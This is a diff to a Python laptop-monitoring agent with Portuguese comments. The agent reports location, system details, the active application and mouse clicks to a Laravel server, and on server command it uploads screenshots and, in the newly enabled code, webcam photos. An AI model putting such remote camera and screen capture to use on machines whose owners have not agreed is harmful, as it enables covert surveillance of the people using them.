@@ -1,4 +1,3 @@
-# pipa_monitor_completo.py
 import threading
 import time
 import requests
@@ -54,7 +53,7 @@ class PIPAMonitor:
         print(f"[PIPA] Enviando dados para: {laravel_url}")
 
     def verificar_conexao_servidor(self):
-        """Verifica se o servidor está online"""
+        # Verifica se o servidor laravel esta online
         try:
             test_url = f"{self.laravel_url}/api/test"
             response = requests.get(test_url, timeout=5)
@@ -71,21 +70,21 @@ class PIPAMonitor:
         return False
 
     def aguardar_conexao(self):
-        """Aguarda até que o servidor esteja online"""
+        # caso o servidor esteja offiline aguarda e tenta reconetar
         while self.monitorando and not self.verificar_conexao_servidor():
             self.contador_tentativas += 1
             print(f"[CONEXAO] Tentativa {self.contador_tentativas} - Reconectando em 20 segundos...")
             
-            # Aguarda 20 segundos ou até interrupção
+            # aguarda 20 segundos
             for i in range(20):
                 if not self.monitorando:
                     return False
                 time.sleep(1)
         
-        return self.servidor_online
+        return self.servidor_online # tenta verificar se o servidor esta olina
 
     def obter_localizacao(self):
-        """Tenta obter localização aproximada via IP"""
+        # tenta obter a localização via geocoder ou api publica
         try:
             try:
                 import geocoder
@@ -104,7 +103,7 @@ class PIPAMonitor:
             except ImportError:
                 print("[LOCALIZACAO] Geocoder não disponível, usando API alternativa")
             
-            # Fallback para API pública caso não funcione
+            # caso o geocoder falhe tenta usar uma api publica secundaria
             response = requests.get('http://ip-api.com/json/', timeout=5)
             if response.status_code == 200:
                 data = response.json()
@@ -124,7 +123,7 @@ class PIPAMonitor:
         except Exception as e:
             print(f"[LOCALIZACAO] Erro: {e}")
         
-        # Fallback final
+        # caso ambas de erro mostra mensagem generica
         return {
             'cidade': 'Não detectada',
             'estado': 'N/A',
@@ -135,15 +134,15 @@ class PIPAMonitor:
         }
 
     def get_public_ip(self):
-        """Obtém IP público"""
+        # obetem o ip publico
         try:
             response = requests.get('https://api.ipify.org', timeout=5)
             return response.text
         except:
             return "Não disponível"
 
+    # funcao para obter o aplicativo ativo 
     def obter_aplicativo_ativo(self):
-        """Obtém o aplicativo em primeiro plano (Windows)"""
         try:
             if platform.system() == 'Windows':
                 import win32gui
@@ -176,21 +175,21 @@ class PIPAMonitor:
                 'timestamp': datetime.now().isoformat()
             }
 
+    # captura informacoes completas do sistema
     def capturar_info_completa_sistema(self):
-        """Captura informações completas do sistema com localização"""
         try:
             hostname = platform.node()
             sistema_operacional = f"{platform.system()} {platform.release()}"
             usuario = getpass.getuser()
             ip_address = self.get_ip_address()
             
-            # Captura aplicativo atual
+            # faz a chamada para a função de obter o aplicativo atual
             aplicativo_atual = self.obter_aplicativo_ativo()
             
-            # Captura localização
+            # faz a chamada para a função de obter localização
             localizacao = self.obter_localizacao()
             
-            # Informações de hardware
+            # coleta informações do hardware
             memoria = psutil.virtual_memory()
             disco = psutil.disk_usage('/' if platform.system() != 'Windows' else 'C:')
             
@@ -224,7 +223,7 @@ class PIPAMonitor:
             }
 
     def get_ip_address(self):
-        """Obtém endereço IP local"""
+        #obtem o ip local
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             s.connect(("8.8.8.8", 80))
@@ -233,7 +232,7 @@ class PIPAMonitor:
             return "127.0.0.1"
 
     def obter_token_csrf(self):
-        """Obtém token CSRF do Laravel"""
+        # colete o token CSRF do laravel
         if not self.servidor_online:
             return False
             
@@ -256,8 +255,8 @@ class PIPAMonitor:
             print(f"[CSRF]  Erro: {e}")
             return False
 
+    # faz a requisicao para o servidor
     def fazer_requisicao(self, metodo, endpoint, dados=None):
-        """Faz requisição com tratamento de CSRF"""
         if not self.servidor_online:
             print(f"[REQUISICAO] Servidor offline, requisição cancelada")
             return None
@@ -277,7 +276,6 @@ class PIPAMonitor:
         
         try:
             if metodo.upper() == 'POST':
-                # Log dos dados (sem mostrar a imagem completa)
                 if dados and 'dados' in dados:
                     dados_log = dados.copy()
                     dados_log['dados'] = f"[BASE64_DATA:{len(dados['dados'])}bytes]"
@@ -313,8 +311,8 @@ class PIPAMonitor:
             print(f"[REQUISICAO]  Erro inesperado: {e}")
             return None
 
-    def capturar_screenshot_rapido(self):
-        """Captura screenshot otimizado"""
+    # captura uma print da tela
+    def catura_print(self):
         try:
             screenshot = ImageGrab.grab()
             
@@ -339,8 +337,59 @@ class PIPAMonitor:
             print(f"[SCREEN] Erro: {e}")
             return None
 
+    # tira uma foto usando a webcam
+    def capturar_webcam(self):
+        try:
+            # tenta acessar a webcam
+            cap = cv2.VideoCapture(0)
+            
+            if not cap.isOpened():
+                print("[WEBCAM] Não foi possível abrir a webcam")
+                return None
+            
+            # configura qualidade da captura
+            cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
+            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
+            cap.set(cv2.CAP_PROP_FPS, 30)
+            
+            # Lê um frame
+            ret, frame = cap.read()
+            
+            if not ret:
+                print("[WEBCAM] Não foi possível ler o frame da webcam")
+                cap.release()
+                return None
+            
+            # Libera a webcam
+            cap.release()
+            
+            # Converte BGR (OpenCV) para RGB
+            frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+            image = Image.fromarray(frame_rgb)
+            
+            # Redimensiona para otimizar
+            largura_original, altura_original = image.size
+            nova_largura = 800
+            nova_altura = int((nova_largura / largura_original) * altura_original)
+            
+            if largura_original > nova_largura:
+                image = image.resize((nova_largura, nova_altura), Image.Resampling.LANCZOS)
+            
+            # Converte para JPEG
+            img_buffer = io.BytesIO()
+            image.save(img_buffer, format='JPEG', quality=70, optimize=True)
+            img_str = base64.b64encode(img_buffer.getvalue()).decode()
+            
+            tamanho_kb = len(img_str) / 1024
+            print(f"[WEBCAM] Capturado - {tamanho_kb:.1f} KB")
+            return img_str
+            
+        except Exception as e:
+            print(f"[WEBCAM] Erro: {e}")
+            return None
+
+    # captura cliques do mouse
     def mouse_on_click(self, x, y, button, pressed):
-        """Captura cliques do mouse"""
         if pressed:
             try:
                 self.ultima_atividade = datetime.now()
@@ -362,8 +411,8 @@ class PIPAMonitor:
             except Exception as e:
                 print(f"[MOUSE] Erro: {e}")
 
+    # envia sinal de vida para o servidor
     def enviar_heartbeat(self):
-        """Envia heartbeat com localização"""
         if not self.servidor_online:
             print(f"[HEARTBEAT]  Servidor offline, heartbeat cancelado")
             return
@@ -371,7 +420,7 @@ class PIPAMonitor:
         try:
             self.contador_heartbeat += 1
             
-            # Atualiza informações a cada 3 heartbeats
+            # atualiza informações a cada 3 heartbeats
             if self.contador_heartbeat % 3 == 0:
                 self.dados_sistema.update(self.capturar_info_completa_sistema())
             
@@ -394,7 +443,7 @@ class PIPAMonitor:
             
             if response and response.status_code == 200:
                 print(f"[HEARTBEAT] Dados enviados com sucesso")
-                # Limpa histórico após envio bem-sucedido
+                # limpa histórico após envio bem-sucedido
                 self.historico_cliques = []
             else:
                 status = response.status_code if response else 'N/A'
@@ -403,8 +452,8 @@ class PIPAMonitor:
         except Exception as e:
             print(f"[HEARTBEAT]  Erro: {e}")
 
+    # verifica os comandos enviados pelo servidor
     def verificar_comandos_servidor(self):
-        """Verifica comandos do servidor"""
         if not self.servidor_online:
             return
             
@@ -417,7 +466,7 @@ class PIPAMonitor:
                 print(f"[COMANDOS] {len(comandos)} comando(s) recebido(s)")
                 
                 if comandos:
-                    # Filtra comandos já executados
+                    # filtra os comandos ja executados
                     novos_comandos = []
                     for comando in comandos:
                         comando_id = comando.get('id')
@@ -436,8 +485,8 @@ class PIPAMonitor:
         except Exception as e:
             print(f"[COMANDOS] Erro: {e}")
 
+    # executa os comandos recebidos do servidor
     def executar_comandos(self, comandos):
-        """Executa comandos recebidos"""
         for comando in comandos:
             acao = comando.get('acao')
             comando_id = comando.get('id')
@@ -449,7 +498,7 @@ class PIPAMonitor:
             if acao == 'screenshot':
                 resultado = self.executar_screenshot(comando_id)
             elif acao == 'webcam':
-                print(f"[COMANDOS] Webcam temporariamente desativada")
+                resultado = self.executar_webcam(comando_id)
             else:
                 print(f"[COMANDOS] Comando desconhecido: {acao}")
                 continue
@@ -457,12 +506,12 @@ class PIPAMonitor:
             tempo_execucao = time.time() - inicio
             print(f"[COMANDOS] {acao} concluído em {tempo_execucao:.1f}s")
 
+    # executa a print e envia para o servidor
     def executar_screenshot(self, comando_id):
-        """Executa screenshot e envia para servidor"""
         try:
             print(f"[SCREEN] Iniciando captura...")
             
-            screenshot = self.capturar_screenshot_rapido()
+            screenshot = self.catura_print()
             
             if not screenshot:
                 print(f"[SCREEN] Falha na captura")
@@ -494,35 +543,70 @@ class PIPAMonitor:
             print(f"[SCREEN] Erro: {e}")
             return False
 
+    # executa a captura da webcam e envia para o servidor
+    def executar_webcam(self, comando_id):
+        try:
+            print(f"[WEBCAM] Iniciando captura...")
+            
+            webcam_image = self.capturar_webcam()
+            
+            if not webcam_image:
+                print(f"[WEBCAM] Falha na captura")
+                return False
+            
+            payload = {
+                'notebook_id': self.notebook_id,
+                'tipo': 'webcam',
+                'dados': webcam_image,
+                'comando_id': comando_id,
+                'limpar_anterior': True,
+                'timestamp': datetime.now().isoformat()
+            }
+            
+            response = self.fazer_requisicao('POST', '/notebook/midia', payload)
+            
+            if response is None:
+                print(f"[WEBCAM] Nenhuma resposta do servidor")
+                return False
+                
+            if response.status_code == 200:
+                print(f"[WEBCAM] Imagem enviada com sucesso!")
+                return True
+            else:
+                print(f"[WEBCAM] Erro HTTP {response.status_code}")
+                return False
+                
+        except Exception as e:
+            print(f"[WEBCAM] Erro: {e}")
+            return False
+
+    # loop principal para mandar os sinais de vida 
     def heartbeat_loop(self):
-        """Loop principal com reconexão automática"""
         while self.monitorando:
             try:
-                # Verifica se o servidor está online
+                # verifica se o servidor esta online
                 if not self.servidor_online:
                     print(f"[PIPA] Verificando conexão com servidor...")
                     if self.aguardar_conexao():
-                        # Reconectou, obtém novo token CSRF
                         self.obter_token_csrf()
                 
-                # Se servidor online, executa operações normais
+                # se servidor esta online executa operações normais
                 if self.servidor_online:
                     self.enviar_heartbeat()
                     self.verificar_comandos_servidor()
-                    time.sleep(30)  # Intervalo normal entre heartbeats
+                    time.sleep(30) 
                 else:
-                    # Aguarda curto período antes de verificar novamente
                     time.sleep(5)
                     
             except Exception as e:
                 print(f"[LOOP] Erro: {e}")
                 time.sleep(10)
 
+    # inicia o monitoramento principal
     def iniciar_monitoramento(self):
-        """Inicia monitoramento"""
-        print("[PIPA] 🔄 Iniciando configuração...")
+        print("[PIPA] Iniciando configuração...")
         
-        # Aguarda conexão inicial com servidor
+        # aguarda conexão inicial com servidor
         if not self.aguardar_conexao():
             print("[PIPA] Não foi possível conectar ao servidor inicialmente")
             return
@@ -530,7 +614,6 @@ class PIPAMonitor:
         if not self.obter_token_csrf():
             print("[PIPA] Continuando sem CSRF token...")
         
-        # Inicia listeners
         try:
             self.mouse_listener = MouseListener(on_click=self.mouse_on_click)
             self.mouse_listener.start()
@@ -539,12 +622,12 @@ class PIPAMonitor:
         except Exception as e:
             print(f"[LISTENERS] Erro: {e}")
         
-        # Inicia heartbeat
+        # Inicia sinais de vida
         heartbeat_thread = threading.Thread(target=self.heartbeat_loop)
         heartbeat_thread.daemon = True
         heartbeat_thread.start()
         
-        # Mostra informações iniciais
+        # mostra informações iniciais no terminal
         localizacao = self.dados_sistema.get('localizacao', {})
         print(f"[PIPA] Monitoramento ativo")
         print(f"[PIPA] Localização: {localizacao.get('cidade', 'N/A')}, {localizacao.get('estado', 'N/A')}")
@@ -560,14 +643,14 @@ class PIPAMonitor:
             self.monitorando = False
 
 if __name__ == "__main__":
-    LARAVEL_URL = "http://192.168.5.38:8000"
-    NOTEBOOK_ID = "computador-teste"
+    LARAVEL_URL = "http://localhost:8000"       # ajuste para a url do servidor 
+    NOTEBOOK_ID = "computador-teste"            # ajuste o nome para identificar a maquina que sera executada o script 
     
-    # Verifica dependências
-    print("[INICIO] 🔍 Verificando dependências...")
+    # verifica se as dependências estao funcionando
+    print("[INICIO] Verificando dependências...")
     
     try:
-        # Tenta importar geocoder
+        # importar geocoder
         try:
             import geocoder
             print("[DEPENDENCIAS] Geocoder disponível")
@@ -587,7 +670,7 @@ if __name__ == "__main__":
     except Exception as e:
         print(f"[DEPENDENCIAS] Erro: {e}")
     
-    # Inicia o monitor (não testa conexão inicial pois já tem reconexão automática)
-    print("[INICIO] 🚀 Iniciando monitor PIPA...")
+    # Inicia o script
+    print("[INICIO] Iniciando monitor PIPA...")
     monitor = PIPAMonitor(LARAVEL_URL, NOTEBOOK_ID)
     monitor.iniciar_monitoramento()
